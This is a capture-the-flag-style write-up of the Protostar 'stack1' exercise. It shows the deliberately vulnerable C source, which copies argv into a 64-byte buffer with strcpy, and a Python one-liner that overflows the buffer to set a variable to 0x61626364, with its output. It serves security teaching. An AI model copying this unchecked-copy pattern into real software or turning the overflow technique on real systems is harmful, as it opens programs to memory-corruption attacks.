
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 1   =-=-=-=-=


	
1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 

	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
	  volatile int modified;
	  char buffer[64];

	  if(argc == 1) {
	      errx(1, "please specify an argument\n");
	  }

	  modified = 0;
	  strcpy(buffer, argv[1]);

	  if(modified == 0x61626364) {	
	      printf("you have correctly got the variable to the right value\n");
  		}
  	  else {
    	printf("Try again, you got 0x%08x\n", modified);
  		}
	}



3.	This is similar to probleum in 'stack0', here we need to overflow the buffer such that
	the variable modified is altered and stores the value '0x61626364'. Since the VM we are
	working on is little endian architecture, therefore the value to be placed in memory 
	should be reverse order.


4. 	We again use python for crafting the string -

		$ python -c 'print "A"*64 + "\x64\x63\x62\x61"'	
		AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba

		$ ./stack1 
		AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
		you have correctly got the variable to the right value


	Cheers,